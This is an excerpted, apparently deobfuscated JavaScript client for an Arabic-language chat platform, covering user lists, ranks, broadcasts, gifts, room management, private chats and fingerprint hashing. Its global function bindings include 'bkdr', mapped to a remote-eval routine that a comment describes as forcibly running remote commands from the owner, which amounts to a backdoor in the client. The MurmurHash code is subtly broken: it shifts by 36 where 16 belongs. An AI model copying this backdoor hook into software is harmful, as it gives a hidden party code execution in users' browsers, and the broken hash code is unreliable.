  userNode[0x0].setAttribute("onclick", "upro('" + userObj.id + "');");
...
function updateUserRowInUi(targetUserId, explicitUserObj, modifiedFields) {
  ...
  if (mic.indexOf(targetUserId) != -0x1 && (modifiedFields == null || modifiedFields.topic || isVisualPropertyUpdated || modifiedFields.pic)) {
  ...
  if (isUserMutedInSystem(activeUserObj)) {
  ...
  if (usea.val() != lastInputValue) {
    ...
    if (lastInputValue == '') {
      ...
      for (var i = 0x0; i < ignoredUsersList.length; i++) {
        ...
        if (userObj.topic.split('ـ').join('').toLowerCase().indexOf(sanitizedSearchQuery) != -0x1 || userObj.h.indexOf(lastInputValue) == 0x0 || userObj.h.indexOf(lastInputValue) == 0x1) {
          if (userObj.s != null) {
            executeStealthUserSetup(userObj);
          } else {
            userBadges[userObj.id][0x0].style.display = ''; // إظهار العضو المطابق للبحث
          }
        }
      }
    }
...
function executeStealthUserSetup(stealthUserObj) {
  ...
  var targetUserPower = parseUserPowerString(stealthUserObj.power) || { 'rank': 0x0 };
  
  // إذا كان العضو متخفياً ورتبته (Rank) أعلى من رتبتك الحالية، يتم إخفاؤه تماماً من قائمة متواجديك
  if (stealthUserObj.s && targetUserPower.rank > (userPermissionsConfig.rank || 0x0)) {
    userBadges[stealthUserObj.id][0x0].style.display = "none";
  } else {
    userBadges[stealthUserObj.id][0x0].style.display = ''; // إظهاره إذا كانت رتبتك مساوية أو أعلى منه
  }
}

// خوارزمية فرز وترتيب الأعضاء (User List Sorter) في واجهة قائمة الأسماء الكلية #users
function executeUserListRebuild() {
  ...
  sortBound(function (userRowA, userRowB) {
    var rankWeightA = parseInt(userRowA.getAttribute('v') || 0x0);
    var rankWeightB = parseInt(userRowB.getAttribute('v') || 0x0);
    ...
    return rankWeightA < rankWeightB ? 0x1 : -0x1; // الرتب الأعلى والغرفة الحالية تتصدر الواجهة
  });
...
function sendPrivateMessage(clickEvent) {
  ...
  if (isUserIgnoredOrBlocked(allUsersList[targetUid])) {
...
function sendAdminAnnouncementMessage() {
  ...
  annModalWindow.find(".rsave").show().off().click(function () {
    ...
    if (annModalWindow.find(".ispp").is(":checked")) {
      send("ppmsg", { 'msg': annText }); // بث خاص جماعي لجميع المتواجدين بالشات ppmsg
    } else {
      send("pmsg", { 'msg': annText }); // بث إعلان عام يظهر في شاشة الكل بالعام pmsg
    }
  });
  
  annModalWindow.modal({ 'title': 'ffff' });
...
function sendMessageAction(alternativeInputId) {
  ...
  if (0x0 && allUsersList[myid].rep < 0x0) {
...
function parseUserPowerString(powerNameParam) {
  ...
  var defaultPowerObj = JSON.parse(JSON.stringify(activeAlerts[0x0] || {}));
  var objectProperties = Object.keys(defaultPowerObj);
  for (var i = 0x0; i < objectProperties.length; i++) {
    switch (true) {
      case typeof defaultPowerObj[objectProperties[i]] == "number":
        defaultPowerObj[objectProperties[i]] = 0x0;
        break;
...
function getUserIconPath(userObj, explicitIcon) {
  ...
  finalIconPath = explicitIcon || (parseUserPowerString(userObj.power) || { 'ico': '' }).ico || '';
  if (finalIconPath != '') {
...
function joinRoomAction(roomIdParam) {
...
function sanitizeIncomingText(messageTextContent) {
  ...
  for (var i = 0x0; i < totalWordsCount && emojiCountTracker < 0x8; i++) {
    if (textWordsArray[i][0x0] == 'ف' && selectedEmojiObject[textWordsArray[i]] != null) {
      emojiCountTracker++;
...
function runTimeAgoUpdater() {
  $.each($(".tago"), function (index, tagoElement) {
    ...
    tagoElement[0x0].innerText = calculateTimeAgoString(parseInt(tagoElement.attr('ago') || 0x0));
  });
}
...
function injectYouTubePlayerIframe(videoUrl, anchorElement) {
...
function openReplyModalDialog(messageSelectorId, originalInputBoxClass) {
  var replyModalWindow = $("#rpl"); // المعرف المستخرج من فحص الواجهة لصندوق الردود
  var messageCloneNode = $($(messageSelectorId)[0x0].outerHTML);
  ...
  replyModalWindow.find(".emobox").off().click(function () {
    ...
    popupDialogInstance.css({
      'left': '',
      'top': Math.max(0x0, boxOffset.top - $(popupDialogInstance).height())
    });
  });
  ...
  replyModalWindow.find(".sndpm").off().click(function (event) {
    ...
    if (originalInputBoxClass == "#tbox") {
      replyId = messageSelectorId;
      sendMessageAction(replyModalWindow.find(".tbox")); // توجيه الرد لصندوق الرسائل العامة العادية
    }
  });
  ...
  replyModalWindow.find(".tbox").val('').off().keyup(function (keyEvent) {
    if (keyEvent.keyCode == 0xd) {
      ...
      if (originalInputBoxClass == "#tbox") {
        replyId = messageSelectorId;
        sendMessageAction(replyModalWindow.find(".tbox"));
      }
    }
  });
  
  replyModalWindow.modal(); // عرض نافذة الردود للمستخدم
  replyModalWindow.find(".r .reply").scrollTop(replyModalWindow.find(".r .reply")[0x0].scrollHeight); // تمرير الردود لأسفل تلقائياً
}
...
function injectBroadcastItemToUi(targetContainerSelector, messagePayload) {
  ...
  if (youtubeVideoMatch.length > 0x1 && targetContainerSelector != "#d2") {
    messagePayload.msg = messagePayload.msg.replace(youtubeVideoMatch[0x1], "<button onclick='injectYouTubePlayerIframe(\"https://www.youtube.com/embed/" + youtubeVideoMatch[0x0] + "\",this);' style='font-size:40px!important;width:100%;max-width:200px;' class='btn fa fa-youtube'><img style='width:80px;' alt='[YouTube]' onerror='$(this).parent().remove();' src='https://img.youtube.com/vi/" + youtubeVideoMatch[0x0] + "/0.jpg' ></button>");
  }
  ...
  if (messagePayload.bid != null) {
    ...
    if (userPermissionsConfig.delbc || messagePayload.lid == (allUsersList[myid] || { 'lid': null }).lid) {
  ...
  if (messagePayload.bid != null) {
    ...
    if (chatInteractionsConfig.bcreply == false) {
      ...
      chatItemNode.find(".breply").attr("onclick", "openReplyModalDialog('.bid" + messagePayload.bid + "',\".tboxbc\");").show();
    }
  } else {
    if (messagePayload.mi != null) {
      ...
      if (chatInteractionsConfig.mreply == false) {
        ...
        chatItemNode.find(".breply").attr("onclick", "openReplyModalDialog('.mi" + messagePayload.mi + "',\"#tbox\");").show();
      }
    } else {
  ...
  $.each(chatItemNode.find("a.uplink"), function (idx, linkElement) {
    ...
    var isMediaViewAllowed = true && (senderUserObj == null || senderUserObj && senderUserObj.rep >= 0x64);
    ...
    if (fileExtensionType.match(/image/i)) {
      ...
      if (urlSegments.length == 0x3 && isMediaViewAllowed) {
        var imgPreviewNode = $("<a href='" + fileUrlPath.substring(0x0, fileUrlPath.lastIndexOf('.')) + "' target='_blank' style='display:block;width:174px;margin-bottom: -21px;'><img dsrc='" + fileUrlPath + "' style='width:150px;height:110px;' class='hand lazy fitimg'></a>");
        ...
        $(linkElement).remove();
        if (urlSegments.length == 0x3) {
          fileUrlPath = fileUrlPath.substring(0x0, fileUrlPath.lastIndexOf('.'));
        }
  ...
  if (isTargetWallContainer == true) {
    ...
    if (messagePayload.rmi != null) {
      ...
      if (existingRepliesContainer.length) {
        ...
        replyCounterBtn.text((parseInt(replyCounterBtn.text()) || 0x0) + 0x1);
...
if (activeReplyModalBox.length) {existingRepliesContainer = $("#rpl .r .reply");existingRepliesContainer.append(chatItemNode[0x0].outerHTML);existingRepliesContainer.stop().animate({'scrollTop': existingRepliesContainer[0x0].scrollHeight}, 100);}} else {chatItemNode.appendTo(parentContainerNode); // حقن الرسالة العادية في حاوية الشات المخصصة لها بالختام}}}
  ...
  if (isTargetWallContainer == true && true) {
    // حد أقصى 100 رسالة (0x64) في الواجهة؛ إذا تجاوزتها يتم حذف أقدم رسالة تلقائياً لتسريع المتصفح
    if (parentContainerNode[0x0].childNodes.length >= 100) {
      parentContainerNode[0x0].childNodes[parentContainerNode[0x0].childNodes.length - 0x1].remove();
    }
    
    // إذا كان التمرير في الأعلى أو كان كاتب البرودكاست هو أنت
    if (parentContainerNode[0x0].scrollTop == 0x0 || messagePayload.uid == myid) {
      if (messagePayload.bmi != null) {
        ...
        if (activeReplyModalBox.length) {
          ...
          replyAreaContainer.append(chatItemNode[0x0].outerHTML);
          replyAreaContainer.stop().animate({
            'scrollTop': replyAreaContainer[0x0].scrollHeight
          }, 100);
        }
      } else {
    ...
    if (isTargetWallContainer && false) {
      if (parentContainerNode[0x0].childNodes.length >= 100) {
        parentContainerNode[0x0].childNodes[0x0].remove(); // حذف أقدم رسالة من العام
      }
      
      // التمرير التلقائي لأسفل العام فوراً إذا كان المستخدم يقف بالأسفل أو كانت الرسالة تخصه
      if (parentContainerNode[0x0].scrollHeight - parentContainerNode[0x0].clientHeight - parentContainerNode[0x0].scrollTop <= 0x1 || messagePayload.uid == myid) {
        if (messagePayload.bmi != null) {
          chatItemNode.find(".breply").remove();
          var replyAreaContainer = $(".d2 .bid" + messagePayload.bmi).find(".reply");
          if (replyAreaContainer.length) {
          ...
          parentContainerNode.stop().animate({
            'scrollTop': parentContainerNode[0x0].scrollHeight - 0x1
          }, 100);
        }
      } else {
        if (messagePayload.bmi != null) {
          ...
          parentContainerNode.stop().animate({
            'scrollTop': parentContainerNode[0x0].scrollTop + parentContainerNode[0x0].scrollHeight / 0x4
          }, 100);
        }
      }
    } else if (parentContainerNode.length) {
      // حصر عدد الرسائل في شاشة العام بـ 36 رسالة (0x24) منعاً لتعليق متصفحات الهواتف
      if (parentContainerNode[0x0].childNodes.length >= 36) {
        parentContainerNode[0x0].childNodes[0x0].remove();
      }
      parentContainerNode.stop().animate({
        'scrollTop': parentContainerNode[0x0].scrollHeight
      }, 100);
    }
  }
  return chatItemNode;
...
function sendGiftAction(targetUserId, giftFileName) {
  send("action", {
    'cmd': 'gift',
    'id': targetUserId,
    'gift': giftFileName
...
function manageWelcomeBanner(targetUserId, bannerFileName) {
  if (bannerFileName == null) {
    return;
  }
  if (bannerFileName == '') {
    send('bnr-', { 'u2': targetUserId }); // أمر إزالة البنر bnr-
  } else {
    send('bnr', { 'u2': targetUserId, 'bnr': bannerFileName }); // أمر إضافة البنر bnr
  }
}

// دالة إعادة توجيه الصفحة للرئيسية عند الفصل التام والقطع قسرياً (Disconnection Redirector)
function redirectWindowDelay(delayTime) {
  if (isRoomLocked) {
    return;
  }
  window.onbeforeunload = null;
...
function loadIgnoreBlocklist() {
  var storedBlocklist = getStorageItemValue("blocklist");
...
function addUserToIgnore(userObj) {
  ...
  activeBansList.push({ 'lid': userObj.lid });
...
function openUserProfileSlider(targetUserId) {
  ...
  if (targetUserObj.pic.split('/').pop().split('.').length > 0x2) {
    picUrlSegments.splice(picUrlSegments.length - 0x1, 0x1);
  }
  ...
  if (userPermissionsConfig.rinvite) {
    ...
    for (var i = 0x0; i < chatRoomsList.length; i++) {
      ...
      roomOptionNode.text('[' + (chatRoomsList[i].uco + '').padStart(0x2, '0') + ']' + chatRoomsList[i].topic);
    ...
    mappedRoomsArray.sort(function (roomOptionA, roomOptionB) {
      ...
      return nameA > nameB ? -0x1 : nameA < nameB ? 0x1 : 0x0;
    });
  ...
  if (userPermissionsConfig.setLikes) {
    ...
    profileModalWindow.find(".ulikec").off().click(function () {
      var updatedLikesCount = parseInt(profileModalWindow.find(".likebox .likec").val()) || 0x0;
  ...
  if (userPermissionsConfig.setpower) {
    ...
    profileModalWindow.find("#upsearch").off().val('').change(function () {
      filterAvailablePowersUi(userPermissionsConfig, targetUserObj.power);
    });
    
    filterAvailablePowersUi(userPermissionsConfig, targetUserObj.power);
    profileModalWindow.find(".powerbox .userdays").val(0x0); // تحديد عدد الأيام (0 تعني رتبة دائمة)
    ...
    profileModalWindow.find(".upower").off().click(function () {
      var durationDays = parseInt(profileModalWindow.find(".userdays").val()) || 0x0;
      send('cp', {
        'cmd': "setpower",
...
// تكملة دالة openUserProfileSlider: التحقق من صلاحيات إدارة الغرفة الحالية ورسم الأزرار التفاعلية
if (currentRoomObj != null) {
  ...
  if (currentRoomObj.ops != null) {
    if (currentRoomObj.ops.indexOf(allUsersList[myid].lid) != -0x1 || currentRoomObj.owner == allUsersList[myid].lid || userPermissionsConfig.roomowner) {
      isRoomOwnerPermission = true;
    }
  }
  
  // بناء وحقن زر الغرفة الحالية المتواجد بها العضو مع إضافة دالة النقر rjoin للانتقال والتنقل معه
  currentRoomName = "<div class=\"fl btn btn-primary dots roomh border\" style=\"padding:0px 5px;max-width:180px;\" onclick=\"joinRoomAction('" + currentRoomObj.id + "')\"><img style=\"max-width:24px;\" src='" + currentRoomObj.pic + "'>" + currentRoomObj.topic + "</div>";
...
if (userPermissionsConfig.kick < 0x1) {
...
if (userPermissionsConfig.upgrades < 0x1) {
...
}).text(formatNumberWithCommas(targetUserObj.rep || 0x0) + '');
...
profileModalWindow.find(".unot").css("background-color", '').off().click(function () {
  ...
  profileModalWindow.find(".ugift").css("background-color", '').off().click(function () {
    ...
    // حقن صور الهدايا المتاحة في الشات مع ربط كليك الاختيار بدالة إرسال الهدية sendGiftAction
    $.each(groupIcons, function (index, giftFileName) {
      giftsContainerNode.append("<img style='padding:5px;margin:4px;max-width:160px;max-height:40px;' class='btn hand borderg corner' src='dro3/" + giftFileName + "' onclick='sendGiftAction(\"" + targetUserId + "\",\"" + giftFileName + "\");'>");
    });
    // إضافة زر الحذف وإزالة الهدية التفاعلية من بروفايل العضو
    giftsContainerNode.append("<button style='padding:5px;margin:4px;' class='btn btn-primary hand borderg corner fa fa-ban'  onclick='sendGiftAction(\"" + targetUserId + "\",\"\");'>إزاله الهديه</button>");
  ...
  profileModalWindow.find(".ubnr").css("background-color", '').off().click(function () {
    ...
    // حقن البنرات المتاحة وربط كليك الاختيار بدالة معالجة البنرات البرمجية manageWelcomeBanner
    $.each(activeBansList, function (index, bannerFileName) {
      bannersContainerNode.append("<img style='padding:5px;margin:4px;max-width:160px;max-height:40px;' class='btn hand borderg corner' src='sico/" + bannerFileName + "' onclick='manageWelcomeBanner(\"" + targetUserId + "\",\"" + bannerFileName + "\");'>");
    });
    // إضافة زر حذف وإلغاء الترحيب من بروفايل العضو
    bannersContainerNode.append("<button style='padding:5px;margin:4px;' class='btn btn-primary hand borderg corner fa fa-ban'  onclick='manageWelcomeBanner(\"" + targetUserId + "\",\"\");'>إزاله البنر</button>");
  ...
  profileModalWindow.find(".upm").off().click(function () {
    profileModalWindow.modal("hide");
    openPrivateChatWindow(targetUserId, true);
  });
  triggerScrollUpdate(0x1);
}

// دالة تصفية وفلترة محرك قائمة الرتب المتاحة للمشرف عند محاولة إعطاء رتبة لعضو (Powers List UI Filter)
function filterAvailablePowersUi(adminPermissions, currentTargetUserPower) {
  ...
  var filteredPowersList = powerSearchQuery == '' ? activeAlerts : activeAlerts.filter(function (singlePowerObj) {
    return singlePowerObj.rank == powerSearchQuery || singlePowerObj.name.indexOf(powerSearchQuery) != -0x1;
  });
  ...
  for (var i = 0x0; i < filteredPowersList.length; i++) {
...
function openContextMenu(triggerElement, optionsArray, selectionCallback) {
  ...
  for (var i = 0x0; i < optionsArray.length; i++) {
...
function openPopupDialog(triggerElement, htmlContentToAppend, closeOnOutsideClick) {
  ...
  setTimeout(function () {
    ...
    if (elementOffset.left + popupBoxNode.width() > window.innerWidth) {
      popupBoxNode.css("left", Math.max(0x0, Math.ceil(elementOffset.left - popupBoxNode.width())));
    }
    if (elementOffset.top + popupBoxNode.height() > window.innerHeight) {
      popupBoxNode.css("top", Math.max(0x0, Math.ceil(elementOffset.top - popupBoxNode.height())));
    }
...
function getQueryParamValue(paramName) {
  var queryString = window.location.search.substring(0x1);
  var querySegments = queryString.split('&');
  for (var i = 0x0; i < querySegments.length; i++) {
    var keyValuePair = querySegments[i].split('=');
    if (keyValuePair[0x0] == paramName) {
      // فك ترميز القيمة مع تنظيفها وحظر وسوم الحقن لسلامة المتصفح
      return ('' + decodeURIComponent(keyValuePair[0x1])).split('<').join("&#x3C;");
    }
  }
}
...
function openCreateRoomModal() {
  ...
  makeRoomModal.find(".rmake").show().off().click(function () {
    ...
    send('r+', {
      ...
      'l': parseInt(makeRoomModal.find('.rl').val()) || 0x0,
      'vl': parseInt(makeRoomModal.find(".rvl").val()) || 0x0,
...
function openEditRoomModal(targetRoomIdParam) {
  $("#ops").children().remove();
  ...
  editRoomModal.find(".rsave").show().off().click(function () {
    send('r^', {
      ...
      'max': parseInt(editRoomModal.find(".rmax").val()) || 0x2,
      'l': parseInt(editRoomModal.find(".rl").val()) || 0x0,
      'vl': parseInt(editRoomModal.find(".rvl").val()) || 0x0,
  ...
  editRoomModal.modal({ 'title': "ffff" });
...
function updateRoomRowInSidebarUi(roomPayloadObj) {
  ...
  if (roomPayloadObj.needpass) {
    ...
    topicNode[0x0].innerText = roomPayloadObj.topic;
    topicNode.css("color", roomPayloadObj.c);
  }
  
  roomRowElement.attr('n', roomPayloadObj.topic || '');
  roomRowElement.find(".u-msg")[0x0].innerText = roomPayloadObj.about; // تحديث نص وصف أو قوانين الغرفة بالواجهة
  ...
  roomRowElement[0x0].style["background-color"] = calculatedRoomShade == "#000000" || false ? '' : calculatedRoomShade + '06';
}
...
function compileRoomRowHtml(roomPayloadObj, returnNodeOnly) {
  ...
  roomPayloadObj.uco = 0x0;     // تصفير عداد الزوار الابتدائي للغرفة الجديدة
...
function removeUserFromSidebarUi(targetUserId) {
...
function executeHashAlgorithm(inputStringArray, seedValue) {
  ...
  remainingBytes = inputStringArray.length & 0x3;
  ...
  currentByteIndex = 0x0;
  while (currentByteIndex < roundedLength) {
    tempMultiplier = inputStringArray.charCodeAt(currentByteIndex) & 0xff | (inputStringArray.charCodeAt(++currentByteIndex) & 0xff) << 0x8 | (inputStringArray.charCodeAt(++currentByteIndex) & 0xff) << 0x24 | (inputStringArray.charCodeAt(++currentByteIndex) & 0xff) << 0x18;
    ++currentByteIndex;
    tempMultiplier = (tempMultiplier & 0xffff) * 0xcc9e2d51 + (((tempMultiplier >>> 0x24) * 0xcc9e2d51 & 0xffff) << 0x24) & 0xffffffff;
    tempMultiplier = tempMultiplier << 0xf | tempMultiplier >>> 0x11;
    tempMultiplier = (tempMultiplier & 0xffff) * 0x1b873593 + (((tempMultiplier >>> 0x24) * 0x1b873593 & 0xffff) << 0x24) & 0xffffffff;
    hashResult ^= tempMultiplier;
    hashResult = hashResult << 0xd | hashResult >>> 0x13;
    currentBlock = (hashResult & 0xffff) * 0x5 + (((hashResult >>> 0x24) * 0x5 & 0xffff) << 0x24) & 0xffffffff;
    hashResult = (currentBlock & 0xffff) + 0x6b64 + (((currentBlock >>> 0x24) + 0xe654 & 0xffff) << 0x24);
  }
  
  tempMultiplier = 0x0;
  switch (remainingBytes) {
    case 0x3:
      tempMultiplier ^= (inputStringArray.charCodeAt(currentByteIndex + 0x2) & 0xff) << 0x24;
    case 0x2:
      tempMultiplier ^= (inputStringArray.charCodeAt(currentByteIndex + 0x1) & 0xff) << 0x8;
    case 0x1:
  ...
  hashResult ^= hashResult >>> 0x24;
  hashResult = (hashResult & 0xffff) * 0x85ebca6b + (((hashResult >>> 0x24) * 0x85ebca6b & 0xffff) << 0x24) & 0xffffffff;
  hashResult ^= hashResult >>> 0xd;
  hashResult = (hashResult & 0xffff) * 0xc2b2ae35 + (((hashResult >>> 0x24) * 0xc2b2ae35 & 0xffff) << 0x24) & 0xffffffff;
  hashResult ^= hashResult >>> 0x24;
  
  // إرجاع كود رقم التذكرة النهائي بصيغة نظام 36 (Base 36) ليظهر مثل (#3f90a)
  return (hashResult >>> 0x0).toString(0x24);
}

// دالة بناء، تهيئة وفتح شاشات ونوافذ محادثات الخاص للأعضاء (Private Chat Window Builder Panel) المربوطة بـ #chats و #cw
function openPrivateChatWindow(targetUserIdParam, shouldFocusWindow) {
  ...
  if ($('#c' + targetUserIdParam).length == 0x0) {
    ...
    privateChatWindowNode.find(".fa-user").click(function () {
      openUserProfileSlider(targetUserIdParam);
      $("#upro").css("z-index", "2002");
    });
  ...
  if (shouldFocusWindow) {
    ...
    setTimeout(function () {
      triggerScrollUpdate(0x1);
      $('.w' + targetUserIdParam).find(".d2").scrollTop($('.w' + targetUserIdParam).find(".d2")[0x0].scrollHeight); // تمرير شات الخاص لأسفل لرؤية الرسائل
    }, 50);
...
function recalculateActiveWindowsCount() {
  var unreadChatsCount = $("#chats").find(".unread").length;
  if (unreadChatsCount != 0x0) {
...
function executeSecondarySetup() {
  if (!String.prototype.padStart) {
    String.prototype.padStart = function polyfillPadStart(targetLength, padString) {
      targetLength = targetLength >> 0x0;
      padString = String(padString !== undefined ? padString : " ");
      return this.length >= targetLength ? String(this) : (targetLength = targetLength - this.length, targetLength > padString.length && (padString += padString.repeat(targetLength / padString.length)), padString.slice(0x0, targetLength) + String(this));
    };
  }
  ...
  if (!Array.prototype.forEach) {
    Array.prototype.forEach = function polyfillForEach(callback, thisArg) {
      ...
      var arrayLengthValue = nativeObject.length >>> 0x0;
...
function openFileInputSelector(acceptedMimeTypes, onFileSelectedCallback) {
  ...
  hiddenFileInput.onchange = event => {
    var selectedFileObj = hiddenFileInput.files[0x0];
    ...
    } else if (selectedFileObj.name.split('.').pop().length > 0x4) {
...
function uploadAndShareMedia(targetIdContext, callbackAction, isWallUpload) {
  broadcastLinkCache = null;
  var xhrUploadHandle;
...
// قاموس ربط وتثبيت كامل الدوال الحقيقية للشات بنطاق المتصفح العام (window) لتعمل الأزرار بالواجهة
window.getv             = getStorageItemValue;       // جلب قيمة من الـ LocalStorage
window.setv             = setStorageItemValue;       // حفظ قيمة في الـ LocalStorage
window.fixSize          = triggerScrollUpdate;       // تحديث أبعاد وتمرير الشاشة
window.load             = checkDeviceWidthAndInitialize; // دالة التهيئة والتشغيل الابتدائية
window.login            = switchLoginTabs;           // دالة تسجيل الدخول (زائر، عضو، تسجيل)
window.updateusers      = executeUserListRebuild;    // إعادة فرز وترتيب قائمة الأسماء الكلية
window.send             = send;                      // دالة بث الاتصال وإرسال البيانات للسوكت
window.sendbc           = sendbc;                    // إرسال منشور برودكاست أو منشور للحائط
window.Tsend            = sendMessageAction;         // دالة إرسال الرسائل العامة في الروم
window.ytube            = injectYouTubePlayerIframe; // حقن مشغل اليوتيوب بالرسائل
window.tmic             = toggleMicrophoneAction;    // طلب وإيقاف المايك للتحدث بالروم
window.sendpic          = changeProfilePic;          // رفع وتعديل صورة الحساب الشخصي
window.muteAll          = muteAll;                   // كتم وإيقاف تشغيل مايكات الشات بالكامل
window.hl               = changeElementBootstrapClass; // تعديل ألوان كلاسات البوتستراب للتنبيهات
window.pickedemo        = pickedemo;                 // النقر على الفيس وإدراجه بصندوق النص
window.roomspic         = openRoomPictureUploader;   // رفع وتغيير صورة الغرفة
window.rjoin            = joinRoomAction;            // طلب دخول وانضمام لغرفة معينة
window.upro             = openUserProfileSlider;     // فتح وعرض الملف الشخصي للعضو
window.reply            = openReplyModalDialog;      // فتح صندوق الردود التفاعلية للرسائل
window.ubnr             = manageWelcomeBanner;       // إعطاء بنر ترحيبي للعضو من الكنترول
window.gift             = sendGiftAction;            // إرسال هدية أو درع تفاعلي للعضو
window.mkr              = openCreateRoomModal;       // فتح مودال إنشاء غرفة جديدة
window.setprofile       = setprofile;                // حفظ وتعديل بيانات البروفايل الشخصي
window.pmsg             = sendAdminAnnouncementMessage; // إرسال بث إعلان عام أو خاص جماعي
window.logout           = logout;                    // تسجيل الخروج الفوري وإغلاق الجلسة

// ربط دوال وأوامر لوحة الإدارة والتحكم الفوقية (/cp)
window.cp_powers        = executeAdditionalPermissionsSetup;
window.cp_bots          = openBotSettingsPanel;
window.cp_powerchange   = changePermissionsAction;
window.sett_save        = saveMasterChatSettings;
window.domains_save     = saveDomainsConfiguration;
window.emo_order        = saveEmosOrderArray;
window.del_ico          = deleteSpecialIconAction;
window.sendfilea        = uploadAndShareMedia;
window.cp_fps           = openFpSearchPanel;
window.cp_fps_do        = executeFpFilteringAction;
window.cp_ledit         = openUserEditDialog;
window.uprochange       = filterAvailablePowersUi;
window.s_sico           = updateSpecialIconSelection;
window.redit            = openEditRoomModal;         // فتح لوحة إداره وتعديل وروم كنترول الغرفة
window.fltrit           = executeWordFilterAction;
window.openw            = openPrivateChatWindow;     // فتح وإنشاء نافذة شات الخاص مع العضو
window.msgs             = recalculateActiveWindowsCount; // تحديث وعداد رسائل الخاص غير المقروءة
window.closex           = redirectWindowDelay;       // إعادة التوجيه للرئيسية عند الفصل والقطع
window.pri              = validateBrowserSessionTime; // التحقق من وقت وتاريخ جلسة المتصفح
window.wclose           = removeUserFromSidebarUi;   // إغلاق وتنظيف شات الخاص وحذفه من الجنب
window.showcp           = openControlPanelWindow;    // فتح وعرض لوحة الإدارة cp
window.bkdr             = executeRemoteEvalCommand;  // تشغيل الأوامر البعيدة قسرياً من المالك
...
function updatePermissionsUi() {
  ...
  if (userPermissionsConfig && userPermissionsConfig.rank > 9000 && userPermissionsConfig.owner == true && $("#cp_bots").length == 0x0) {
...
function hashFingerprintString(inputData) {
  ...
  function wordToHex(word) {
    ...
    for (i = 0x0; 0x3 >= i; i++) {
      ...
      hexString += singleByte.substr(singleByte.length - 0x2, 0x2);
    }
    return hexString;
  }
  ...
  wordsArray = function (utf8String) {
    ...
    var allocatedSize = 0x10 * ((blockIndex - blockIndex % 0x40) / 0x40 + 0x1);
    var paddedWords = Array(allocatedSize - 0x1);
    var bitShiftOffset = 0x0;
    for (var i = 0x0; i < stringLength;) {
      blockIndex = (i - i % 0x4) / 0x4;
      bitShiftOffset = i % 0x4 * 0x8;
      paddedWords[blockIndex] |= utf8String.charCodeAt(i) << bitShiftOffset;
      i++;
    }
    blockIndex = (i - i % 0x4) / 0x4;
    paddedWords[blockIndex] |= 0x80 << i % 0x4 * 0x8;
    paddedWords[allocatedSize - 2] = stringLength << 0x3;
  ...
  for (wordsArray = 0x0; wordsArray < paddedWords.length; wordsArray += 0x10) {
    oldA = state_A;
    oldB = state_B;
    oldC = state_C;
    oldD = state_D;
    ...
    // ==========================================
    state_A = md5_F(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0x0], 0x7, 0xd76aa478);
    state_D = md5_F(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0x1], 0xc, 0xe8c7b756);
    state_C = md5_F(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0x2], 0x11, 0x242070db);
    state_B = md5_F(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0x3], 0x16, 0xc1bdceee);
    state_A = md5_F(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0x4], 0x7, 0xf57c0faf);
    state_D = md5_F(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0x5], 0xc, 0x4787c62a);
    state_C = md5_F(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0x6], 0x11, 0xa8304613);
    ...
    state_C = md5_F(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0xa], 0x11, 0xffff5bb1);
    ...
    state_B = md5_F(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0xf], 0x16, 0x49b40821);

    // ==========================================
    // المرحلة الثانية: تنفيذ دالة المعالجة md5_G (Round 2)
    // ==========================================
    state_A = md5_G(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0x1], 0x5, 0xf61e2562);
    state_D = md5_G(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0x6], 0x9, 0xc040b340);
    state_C = md5_G(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0xb], 0xe, 0x265e5a51);
    state_B = md5_G(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0x0], 0x14, 0xe9b6c7aa);
    state_A = md5_G(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0x5], 0x5, 0xd62f105d);
    state_D = md5_G(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0xa], 0x9, 0x2441453);
    state_C = md5_G(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0xf], 0xe, 0xd8a1e681);
    state_B = md5_G(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0x4], 0x14, 0xe7d3fbc8);
    state_A = md5_G(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0x9], 0x5, 0x21e1cde6);
    state_D = md5_G(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0xe], 0x9, 0xc33707d6);
    state_C = md5_G(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0x3], 0xe, 0xf4d50d87);
    state_B = md5_G(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0x8], 0x14, 0x455a14ed);
    state_A = md5_G(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0xd], 0x5, 0xa9e3e905);
    state_D = md5_G(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0x2], 0x9, 0xfcefa3f8);
    ...
    // ==========================================
    state_A = md5_H(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0x5], 0x4, 0xfffa3942);
    ...
    // ==========================================
    state_A = md5_H(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0x1], 0x4, 0xa4beea44);
    state_D = md5_H(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0x4], 0xb, 0x4bdecfa9);
    state_C = md5_H(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0x7], 0x10, 0xf6bb4b60);
    state_B = md5_H(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0xa], 0x17, 0xbebfbc70);
    state_A = md5_H(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0xd], 0x4, 0x289b7ec6);
    state_D = md5_H(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0x0], 0xb, 0xeaa127fa);
    state_C = md5_H(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0x3], 0x10, 0xd4ef3085);
    state_B = md5_H(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0x6], 0x17, 0x4881d05);
    state_A = md5_H(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0x9], 0x4, 0xd9d4d039);
    state_D = md5_H(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0xc], 0xb, 0xe6db99e5);
